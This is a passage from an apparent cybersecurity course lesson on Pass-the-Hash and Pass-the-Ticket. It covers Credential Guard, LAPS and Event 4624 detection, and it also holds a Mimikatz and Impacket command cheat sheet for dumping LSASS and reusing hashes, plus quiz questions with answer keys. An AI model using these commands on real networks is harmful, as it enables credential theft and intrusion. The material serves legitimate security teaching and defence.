plaintext passwords in LSASS.\n\n**Disable it:**\n```powershell\nReg Add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /d 0 /f\n```\n\n**Impact**: Plaintext passwords no longer in LSASS (hashes only)\n\n**Note**: Disabled by default Windows 8.1+, but check older systems\n\n## Defense-in-Depth Summary\n\n**Tier 1: Prevent Credential Theft**\n- ✅ Windows Defender Credential Guard (blocks LSASS dumping)\n- ✅ Disable WDigest (no plaintext passwords)\n- ✅ Protected Users group (no credential caching)\n\n**Tier 2: Limit Credential Reuse**\n- ✅ LAPS (unique local admin passwords)\n- ✅ Restrict admin privileges (least privilege)\n- ✅ Disable NTLM (no Pass-the-Hash)\n\n**Tier 3: Detect Attacks**\n- ✅ Monitor Event 4624 (unusual logon patterns)\n- ✅ NTLM auditing (track NTLM usage)\n- ✅ Honey credentials (tripwires)\n- ✅ EDR/SIEM alerts (behavioral anomalies)\n\n**Tier 4: Limit Blast Radius**\n- ✅ Network segmentation (restrict lateral movement)\n- ✅ JIT admin access (time-limited privileges)\n- ✅ MFA (even compromised creds require second factor)\n\n**Ideal State**: All tiers implemented = Pass-the-Hash becomes very difficult"
    },
    {
      "type": "memory_aid",
      "title": "Pass-the-Hash Memory Framework",
      "content": "## PTH Framework (Attack Steps)\n\n**P**rivilege gain (local admin)\n**T**arget LSASS (dump memory)\n**H**ash extraction (Mimikatz)\n\n**T**est hash validity (which systems?)\n**H**op to next system (lateral movement)\n**E**scalate further (find more creds)\n\n## LSASS Memory Trick\n\n**\"LSASS = Loot Stash\"**\n\nThink of LSASS as a vault containing:\n- **L**ogins (user sessions)\n- **S**ecrets (passwords, hashes)\n- **A**uthentication tokens (Kerberos tickets)\n- **S**ervice credentials\n- **S**essions (cached logons)\n\n## Pass-the-Hash vs Pass-the-Ticket\n\n**Memory aid: \"NTLM = Need To Laterally Move\"**\n\n```\nPass-the-HASH:\n  - Uses NTLM protocol\n  - Hash format: 32 hex chars\n  - Works with IP addresses\n  - Hash never expires\n  - Extracted from LSASS\n\nPass-the-TICKET:\n  - Uses Kerberos protocol\n  - Ticket format: .kirbi or .ccache\n  - Works with FQDNs\n  - Ticket expires (hours)\n  - Extracted from Kerberos cache\n```\n\n## Mimikatz Command Cheat Sheet\n\n**\"PLKP\" = Privilege, Logon, Kerberos, Pass\"**\n\n```cmd\n# P - Privilege (enable debug)\nprivilege::debug\n\n# L - Logon passwords (dump LSASS)\nsekurlsa::logonpasswords\n\n# K - Kerberos tickets (export)\nsekurlsa::tickets /export\nkerberos::list\n\n# P - Pass-the-Hash\nsekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:cmd.exe\n\n# P - Pass-the-Ticket\nkerberos::ptt TICKET.kirbi\n```\n\n## Impacket Tools Memory\n\n**\"PSWE\" Framework:**\n\n- **P**sexec.py - Remote shell (service-based, noisy)\n- **S**ecretsdump.py - Extract credentials remotely\n- **W**miexec.py - Remote shell (WMI-based, stealthy)\n- **E**vil-winrm - PowerShell remoting\n\n**Hash format for Impacket:**\n```\n-hashes LM:NTLM\n-hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n          ↑ Empty LM hash (standard)     ↑ Actual NTLM hash\n```\n\n## Event ID Quick Reference\n\n**Critical Events for Pass-the-Hash Detection:**\n\n- **4624**: Successful logon\n  - Logon Type **3** = Network (Pass-the-Hash common)\n  - Logon Type **9** = NewCredentials (mimikatz pth)\n  - Auth Package: **NTLM** (red flag if should be Kerberos)\n- **4625**: Failed logon (if you see many, hash might be invalid)\n- **4648**: Logon using explicit credentials (mimikatz indicator)\n- **4672**: Special privileges assigned (admin logon)\n\n## Detection Decision Tree\n\n```\nEvent 4624 (Successful Logon)\n    ↓\nAuth Package = NTLM? ──────NO───→ Probably normal\n    ↓ YES\nShould be Kerberos? ───────NO───→ Could be legitimate (IP address, etc.)\n    ↓ YES\nSource IP unusual? ────────YES──→ 🚨 Investigate Pass-the-Hash\n    ↓ NO\nLogon Type = 9? ──────────YES──→ 🚨 Investigate mimikatz pth\n    ↓ NO\nMultiple logons rapid succession?  YES → 🚨 Possible lateral movement\n```\n\n## Defense Priority Stack\n\n**\"CLAMP\" Framework (priority order):**\n\n1. **C**redential Guard (blocks LSASS dumping) ✅ #1 Priority\n2. **L**APS (unique local admin passwords)\n3. **A**udit NTLM (detect usage, work toward disabling)\n4. **M**onitor Event 4624 (detect anomalies)\n5. **P**rotected Users (high-value accounts)\n\n## LAPS Memory Aid\n\n**\"LAPS = Local Admins Passwords Shouldn't match\"**\n\n**Before LAPS:**\n```\nWorkstation A: Administrator:Password123\nWorkstation B: Administrator:Password123  ← Same!\nWorkstation C: Administrator:Password123  ← Same!\n\nCompromise one → Compromise all\n```\n\n**After LAPS:**\n```\nWorkstation A: Administrator:kL9$mQ2pX7vR\nWorkstation B: Administrator:nN4@wY6cT8zB  ← Different\nWorkstation C: Administrator:hJ3!gF5eS9xD  ← Different\n\nCompromise one → Only that one compromised\n```\n\n## Common Mistakes to Avoid\n\n**Attacker Mistakes:**\n❌ Using same hash everywhere (pattern detection)\n❌ Rapid lateral movement (triggers UEBA)\n❌ Not clearing tracks (Event logs show activity)\n❌ Forgetting Credential Guard exists (LSASS dump fails)\n\n**Defender Mistakes:**\n❌ Not enabling Credential Guard (easiest win)\n❌ Same local admin password everywhere (no LAPS)\n❌ Not monitoring Event 4624 (missing attacks)\n❌ Leaving NTLM enabled indefinitely (never migrating)\n\n## Real-World Statistics\n\n**Memorize these numbers:**\n\n- **90%+** of ransomware uses Pass-the-Hash for lateral movement\n- **75%** of organizations have same local admin password everywhere\n- **3-5 systems** average compromise before reaching Domain Admin\n- **10 minutes** average time to dump LSASS and extract hashes\n- **4624** = Successful logon event (most important for detection)\n- **32 chars** = NTLM hash length (128 bits)\n\n## Visual: Attack Path\n\n```\n┌─────────────────────────────────────────┐\n│    TYPICAL PASS-THE-HASH ATTACK PATH    │\n└─────────────────────────────────────────┘\n\n1. Initial Compromise\n   Phishing → Workstation A\n   User: bob (standard user)\n\n2. Privilege Escalation\n   Local exploit → Local Admin\n\n3. Credential Dumping\n   mimikatz # sekurlsa::logonpasswords\n   Found: alice (domain admin cached)\n   NTLM: 64f12cddaa88057e06a81b54e73b949b\n\n4. Lateral Movement\n   psexec.py -hashes ...:64f12... CORP/alice@DC01\n   → Domain Controller access\n\n5. Domain Domination\n   secretsdump.py → All domain credentials\n   ntdsutil → NTDS.dit dump\n   mimikatz # lsadump::lsa → All secrets\n\nTotal Time: 30 minutes from phishing to Domain Admin\n```\n\n## Credential Guard Visualization\n\n```\nWITHOUT Credential Guard:\n┌─────────────┐\n│   LSASS     │ ← Mimikatz can access\n│             │\n│ Credentials │ ← Dumps hashes successfully\n└─────────────┘\n\nWITH Credential Guard:\n┌─────────────────────────────────┐\n│  Secure Container (VBS)         │\n│  ┌─────────────┐               │\n│  │   LSASS     │ ← Isolated    │\n│  │             │               │\n│  │ Credentials │ ← Protected   │\n│  └─────────────┘               │\n└─────────────────────────────────┘\n        ↑\n    Mimikatz ← Blocked!\n    \nResult: sekurlsa::logonpasswords fails\n```\n\n## Quick Checklist: \"Am I Vulnerable?\"\n\n```\n☐ Same local admin password on all workstations? (NO LAPS)\n☐ Credential Guard disabled? (No VBS protection)\n☐ NTLM enabled? (Pass-the-Hash possible)\n☐ Domain Admins log into workstations? (Credentials cached)\n☐ No Event 4624 monitoring? (Attacks go unnoticed)\n☐ WDigest enabled? (Plaintext passwords in LSASS)\n\nIf you checked 3+ boxes: HIGH RISK for Pass-the-Hash\n```\n\nUse these memory aids during penetration tests, security assessments, and incident response."
    },
    {
      "type": "reflection",
      "title": "Self-Assessment and Next Steps",
      "content": "## Knowledge Check Questions\n\n**Question 1: NTLM vs Kerberos**\nExplain why Pass-the-Hash works with NTLM but not with Kerberos. What is the fundamental difference in how these protocols handle authentication?\n\n**Question 2: Credential Guard**\nYou enable Windows Defender Credential Guard on all workstations. A pentester tries to dump LSASS with Mimikatz but fails. However, they still achieve lateral movement. How is this possible? What other attack vectors remain?\n\n**Question 3: Detection Scenario**\nYou see Event 4624 with these details:\n- User: bob\n- Logon Type: 3 (Network)\n- Auth Package: NTLM\n- Source IP: 192.168.1.200\n- Workstation Name: KALI-ATTACKER\n\nBob's normal workstation is DESKTOP-BOB at 192.168.1.50, and your domain uses Kerberos. Is this Pass-the-Hash? What additional information would you check to confirm?\n\n**Question 4: LAPS Impact**\nYour organization implements LAPS. An attacker compromises Workstation A and extracts the local Administrator hash. How does LAPS prevent lateral movement to Workstation B? Does it completely stop the attack or just slow it down?\n\n**Question 5: Red Team Challenge**\nYou're on a red team engagement. You've gained local admin on a workstation and dumped LSASS but found:\n- 5 computer account hashes (workstation$)\n- 2 standard user hashes (no admin privileges elsewhere)\n- No domain admin hashes\n\nWhat's your next move to continue lateral movement? What techniques can you chain with Pass-the-Hash?\n\n## Reflection Prompts\n\n**Prompt 1: Age of the Vulnerability**\n\"Pass-the-Hash has been known since the 1990s but still works in 2024.\"\n\nReflect on:\n- Why hasn't this been fully fixed after 30+ years?\n- What organizational or technical barriers prevent complete mitigation?\n- Is backward compatibility worth the security risk?\n- What does this teach you about security debt?\n\n**Prompt 2: Defense Trade-offs**\n\"Disabling NTLM completely would stop Pass-the-Hash but might break legacy applications.\"\n\nConsider:\n- How do you balance security and operational requirements?\n- What's your approach to convincing leadership to disable NTLM despite potential disruption?\n- How do you identify and migrate legacy applications?\n- Is there an acceptable level of risk, or should we strive for zero NTLM?\n\n**Prompt 3: Detection Philosophy**\n\"Pass-the-Hash uses valid credentials, making it look like legitimate authentication.\"\n\nThink about:\n- How do you differentiate between legitimate admin activity and Pass-the-Hash attacks?\n- What's the balance between detection coverage and false positives?\n- Should you alert on every NTLM authentication or only anomalies?\n- How do you build behavioral baselines for normal activity?\n\n**Prompt 4: Attacker Perspective**\n\"Attackers love Pass-the-Hash because it's fast, reliable, and hard to detect.\"\n\nReflect on:\n- If you were defending a network, what's the ONE change that would most frustrate attackers?\n- Why do attackers prioritize credential theft over exploitation?\n- How has defensive technology (Credential Guard, EDR) changed attacker behavior?\n\n## Practical Application\n\n**Next Steps for Red Teamers:**\n✅ Set up a lab with multiple systems\n✅ Practice credential dumping with Mimikatz and Impacket\n✅ Test Pass-the-Hash with psexec.py, wmiexec.py, CrackMapExec\n✅ Learn to chain Pass-the-Hash with other techniques (Kerberoasting, DCSync)\n✅ Experiment with bypassing Credential Guard (Kerberos attacks)\n\n**Next Steps for Blue Teamers:**\n✅ Check if Credential Guard is enabled on your systems\n✅ Implement LAPS immediately (quick win, high impact)\n✅ Audit NTLM usage in your environment\n✅ Build SIEM detection rules for Event 4624 anomalies\n✅ Deploy honey credentials as tripwires\n✅ Test your defenses (hire a red team or run a tabletop exercise)\n\n**Next Steps for Everyone:**\n✅ Read Microsoft's documentation on Credential Guard\n✅ Study real-world Pass-the-Hash cases (ransomware reports)\n✅ Practice explaining Pass-the-Hash to non-technical stakeholders\n✅ Build a lab and test both attack and defense\n✅ Join cybersecurity communities (Reddit r/netsec, BloodHoundAD Slack)\n\n## Learning Integration\n\n**Pass-the-Hash in the attack chain:**\n\n```\n1. Initial Access\n      ↓\n   (Phishing, exploit)\n      ↓\n2. Execution\n      ↓\n   (Malware, PowerShell)\n      ↓\n3. Privilege Escalation\n      ↓\n   (Local exploit, misconfiguration)\n      ↓\n4. Credential Access      ← Pass-the-Hash (this lesson)\n      ↓\n   (Dump LSASS, extract hashes)\n      ↓\n5. Lateral Movement       ← Pass-the-Hash (this lesson)\n      ↓\n   (Spread to other systems)\n      ↓\n6. Persistence\n      ↓\n   (Golden Ticket, backdoors)\n      ↓\n7. Exfiltration\n```\n\n**Related techniques to study:**\n- **Kerberoasting**: Extract service account hashes (previous lesson)\n- **Golden Ticket**: Ultimate persistence (previous lesson)\n- **DCSync**: Extract all domain credentials\n- **OverPass-the-Hash**: Use NTLM hash to request Kerberos TGT\n- **Mimikatz**: The tool that makes it all possible\n- **BloodHound**: Map attack paths through AD\n\n## Self-Assessment Checklist\n\nRate yourself (1-5) on these competencies:\n\n**Conceptual Understanding:**\n☐ I understand how NTLM authentication works (1-5)\n☐ I can explain why Pass-the-Hash works (1-5)\n☐ I know the difference between Pass-the-Hash and Pass-the-Ticket (1-5)\n☐ I understand where credentials are stored (LSASS) (1-5)\n\n**Technical Skills:**\n☐ I can dump LSASS with Mimikatz (1-5)\n☐ I can perform Pass-the-Hash with Impacket tools (1-5)\n☐ I can extract and inject Kerberos tickets (1-5)\n☐ I can detect Pass-the-Hash in Event logs (1-5)\n\n**Operational Knowledge:**\n☐ I know how to enable Credential Guard (1-5)\n☐ I can implement LAPS (1-5)\n☐ I can build SIEM detection rules (1-5)\n☐ I understand the trade-offs of disabling NTLM (1-5)\n\n**Score yourself:**\n- **48-60**: Expert level, ready for real-world engagements\n- **36-47**: Strong foundation, need more hands-on practice\n- **24-35**: Good conceptual knowledge, focus on technical skills\n- **12-23**: Review lesson sections, build a lab\n- **0-11**: Re-read lesson, use memory aids, watch tutorials\n\n## Advanced Topics to Explore\n\n**Once you've mastered Pass-the-Hash:**\n\n1. **OverPass-the-Hash (Pass-the-Key)**\n   - Use NTLM hash to request Kerberos TGT\n   - Bypass NTLM restrictions but still use stolen hash\n\n2. **Pass-the-Cache**\n   - Linux variant (Kerberos credential cache)\n   - /tmp/krb5cc_* files\n\n3. **Token Impersonation**\n   - Steal access tokens (not credentials)\n   - Incognito, Invoke-TokenManipulation\n\n4. **Credential Relay Attacks**\n   - NTLM relay (different from Pass-the-Hash)\n   - Capture and relay authentication\n\n5. **Mimikatz Deep Dive**\n   - All modules (sekurlsa, kerberos, lsadump, vault, dpapi)\n   - Advanced persistence techniques\n\n## Final Thought\n\nPass-the-Hash is the **workhorse of lateral movement**. It's been around for decades, yet remains one of the most effective techniques. Why? Because it exploits fundamental trust relationships in Windows networks.\n\n**For attackers**: Master Pass-the-Hash and you can move through most networks with ease. It's fast, reliable, and works in 90%+ of environments.\n\n**For defenders**: Implement Credential Guard and LAPS, and you eliminate 80% of Pass-the-Hash risk. The remaining 20% requires detection and monitoring.\n\n**Key Principle**: \"Credentials are the new perimeter.\"\n\nOnce an attacker has valid credentials (even just hashes), perimeter defenses (firewalls, VPNs) are irrelevant. Focus on:\n1. **Protecting credentials** (Credential Guard, LAPS)\n2. **Detecting misuse** (SIEM, EDR, behavioral analytics)\n3. **Limiting blast radius** (network segmentation, least privilege)\n\nMaster Pass-the-Hash, and you'll understand how most modern breaches succeed—and how to stop them."
    },
    {
      "type": "video",
      "title": "Video Tutorial: Pass-the-Hash Attack Demonstration",
      "content": "Watch this comprehensive video tutorial demonstrating Pass-the-Hash and Pass-the-Ticket attacks in a live environment. This video covers LSASS credential dumping, NTLM authentication exploitation, lateral movement with Impacket tools, and defensive countermeasures.\n\n**Video**: [Pass-the-Hash Attack Explained by IppSec](https://www.youtube.com/watch?v=Iq8OGfW16jg)\n\n**What you'll see:**\n- LSASS memory dumping with Mimikatz and Procdump\n- Credential extraction (NTLM hashes, Kerberos tickets)\n- Pass-the-Hash lateral movement using psexec.py, wmiexec.py, and CrackMapExec\n- Pass-the-Ticket demonstration with Kerberos ticket injection\n- Detection techniques via Windows Event logs (Event 4624)\n- Defensive strategies: Credential Guard, LAPS, NTLM restriction\n\n**Duration**: ~22 minutes\n\n**Recommended viewing**: After completing the lesson to see practical implementation of both offensive and defensive techniques.\n\n**Alternative Resource**: [Conda - Pass-the-Hash Explained](https://www.youtube.com/watch?v=5UOszz_vBjk) (~15 min, beginner-friendly)\n\n**Additional Resources:**\n- [HackTricks: Pass-the-Hash](https://book.hacktricks.xyz/windows-hardening/ntlm#pass-the-hash)\n- [Microsoft: Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)\n- [Microsoft: LAPS Deployment Guide](https://www.microsoft.com/en-us/download/details.aspx?id=46899)\n- [MITRE ATT&CK: T1550.002 - Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)\n- [MITRE ATT&CK: T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)"
    }
  ],
  "post_assessment": [
    {
      "question": "You've enabled Windows Defender Credential Guard on all workstations in your domain. A pentester reports they can still perform lateral movement despite being unable to dump credentials from LSASS with Mimikatz. What is the MOST LIKELY technique they're using?",
      "options": [
        "Pass-the-Hash with NTLM hashes extracted before Credential Guard was enabled",
        "Pass-the-Ticket by extracting Kerberos TGTs from the Kerberos credential cache (klist tickets), which Credential Guard doesn't protect",
        "DCSync attack to extract KRBTGT hash directly from the domain controller, bypassing workstation protections",
        "Token impersonation to steal access tokens from other processes, which doesn't require LSASS access"
      ],
      "correct_option": 3,
      "explanation": "Credential Guard protects LSASS from direct memory access (blocks Mimikatz sekurlsa::logonpasswords), but it does NOT protect against all attacks. Token impersonation (T1134) steals access tokens from running processes, which doesn't require LSASS dumping. Tools like Incognito or Invoke-TokenManipulation can list and steal tokens from processes the attacker can access. Additionally, Credential Guard doesn't protect against Kerberos ticket theft from the file system (though it does better protect the Kerberos keys in LSASS). Option A is wrong because old hashes won't work on systems where passwords have been changed. Option B is partially correct but Credential Guard does protect Kerberos keys in LSASS better. Option C (DCSync) requires Domain Admin, not just workstation access."
    },
    {
      "question": "You're analyzing Event 4624 (successful logon) and see: User=alice, LogonType=3, AuthPackage=NTLM, SourceIP=192.168.1.150, WorkstationName=ADMIN-PC. Your environment uses Kerberos by default, and alice's normal workstation is ALICE-LAPTOP at 192.168.1.50. What is the BEST next investigative step?",
      "options": [
        "Immediately disable alice's account; this is clearly a Pass-the-Hash attack",
        "Check if 192.168.1.150 (ADMIN-PC) exists in your environment and if alice legitimately logged into it, then review if there's a reason NTLM was used instead of Kerberos (IP address vs FQDN, workgroup system, etc.)",
        "Ignore it; Event 4624 with NTLM is normal and not suspicious",
        "Check if alice's password was recently changed; if so, the old hash is being reused (Pass-the-Hash)"
      ],
      "correct_option": 1,
      "explanation": "This requires investigation but not immediate account disable. The correct approach: (1) Verify if ADMIN-PC is a legitimate system in your environment, (2) Check if alice has legitimate access to ADMIN-PC, (3) Investigate WHY NTLM was used instead of Kerberos—common reasons include: connection via IP address instead of FQDN, workgroup (non-domain) system, legacy application, DNS failure. (4) Check if alice was actually at that location or if her credentials were stolen. Option A is too reactive without investigation. Option C is wrong—this IS suspicious given the context. Option D misunderstands Pass-the-Hash: the hash works until the password changes, so a recent password change would INVALIDATE an old hash, not enable its reuse."
    },
    {
      "question": "Your organization implements LAPS (Local Administrator Password Solution) across all workstations. An attacker compromises Workstation-A and extracts the local Administrator NTLM hash. They attempt Pass-the-Hash to Workstation-B using this hash. What happens?",
      "options": [
        "Pass-the-Hash succeeds because LAPS doesn't prevent hash reuse, only password reuse",
        "Pass-the-Hash fails because LAPS generates unique passwords for each workstation's local Administrator account, so Workstation-A's hash doesn't match Workstation-B's password",
        "Pass-the-Hash succeeds initially but LAPS detects the attack and rotates passwords within 30 seconds",
        "Pass-the-Hash succeeds if both workstations are in the same LAPS organizational unit"
      ],
      "correct_option": 1,
      "explanation": "LAPS solves the credential reuse problem by ensuring each workstation has a DIFFERENT randomly-generated password for its local Administrator account. Before LAPS, admins typically used the same password everywhere (e.g., 'AdminPass123' on all workstations), so one compromise = all compromised. With LAPS: Workstation-A's local admin password is 'kL9$mQ2pX7vR' (hash: ABC123...) and Workstation-B's local admin password is 'nN4@wY6cT8zB' (hash: DEF456..., DIFFERENT). When the attacker tries Pass-the-Hash with ABC123..., Workstation-B calculates the response using DEF456... and the responses don't match → authentication fails. LAPS prevents HORIZONTAL movement (workstation-to-workstation) using local admin accounts. It doesn't prevent VERTICAL movement if the attacker finds domain credentials."
    },
    {
      "question": "You're on a red team engagement and successfully dump LSASS from a workstation. You extract NTLM hashes for three users: bob (standard user), svc_backup (service account), and alice (Domain Admin). However, your C2 connection is unstable. Which credential should you prioritize exfiltrating FIRST, and why?",
      "options": [
        "bob's hash, because standard users are less monitored and you can use his account stealthily for extended access",
        "svc_backup's hash, because service accounts often have admin rights on multiple servers and passwords rarely change",
        "alice's hash (Domain Admin), because it provides immediate domain compromise and is the highest-value target",
        "All three equally; you should bundle them in a single encrypted exfiltration"
      ],
      "correct_option": 2,
      "explanation": "In a real engagement with unstable C2, you must prioritize. While alice (Domain Admin) seems most valuable, Domain Admin accounts are: (1) most closely monitored, (2) most likely to have passwords changed soon during incident response, (3) may have MFA or additional protections. Service accounts like svc_backup are the sweet spot: (1) often have admin rights on 10-100+ systems, (2) passwords rarely change (sometimes never), (3) less monitored than DA accounts, (4) provide broad access for lateral movement. You can use svc_backup to re-establish persistence even if your initial access is lost. Bob (option A) is least valuable—standard user with limited access. Option D is ideal in theory but the question specifies unstable connection, requiring prioritization. In practice: exfiltrate ALL credentials, but if forced to choose, service accounts provide the best risk/reward ratio for long-term access."
    }
  ],
  "jim_kwik_principles": [
    "Association: Link Pass-the-Hash to credit card fraud (using card without PIN) and Pass-the-Ticket to boarding pass reuse (presenting someone else's ticket). Memory through metaphor.",
    "Chunking: Break the lesson into chunks: NTLM basics → credential extraction → Pass-the-Hash execution → Pass-the-Ticket → detection → defense. Master each chunk separately.",
    "Active Recall: Close the lesson and explain Pass-the-Hash to someone (or to yourself). Draw the NTLM authentication flow from memory. Test yourself on Mimikatz commands.",
    "Spaced Repetition: Review this lesson after 1 day, 3 days, 1 week, 1 month. Each review strengthens retention and builds long-term mastery.",
    "Practice: Build a lab with 2-3 VMs. Actually perform Pass-the-Hash attacks and test defenses (Credential Guard, LAPS). Hands-on experience cements learning."
  ]
}